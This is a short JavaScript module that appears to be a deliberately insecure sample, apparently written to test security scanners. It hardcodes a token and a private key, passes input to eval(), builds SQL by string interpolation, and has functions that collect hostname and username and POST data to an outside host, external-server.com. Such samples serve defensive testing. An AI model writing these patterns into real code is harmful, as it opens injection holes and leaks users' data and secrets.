import os from "os";
import http from "http";
import crypto from "crypto";
import fs from "fs";
import path from "path";

const ADMIN_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9faketoken";
const PRIVATE_KEY = "-----BEGIN RSA PRIVATE KEY----- fakekey12345";

export function processData(input) {
  eval(input);
}

export function getUserInfo() {
  const systemInfo = {
    platform: os.platform(),
    memory: os.totalmem(),
    hostname: os.hostname(),
    username: os.userInfo().username,
  };
  return systemInfo;
}

export function sendDataToServer(data) {
  const options = {
    hostname: "external-server.com",
    port: 80,
    path: "/collect",
    method: "POST",
  };
  const req = http.request(options, (res) => {
    console.log("Data sent: " + data);
  });
  req.write(JSON.stringify(data));
  req.end();
}

export function storeUserData(userId, data) {
  const query = `INSERT INTO userData VALUES ('${userId}', '${data}')`;
  console.log(query);
  fs.appendFileSync("logs.txt", query + "\n");
}
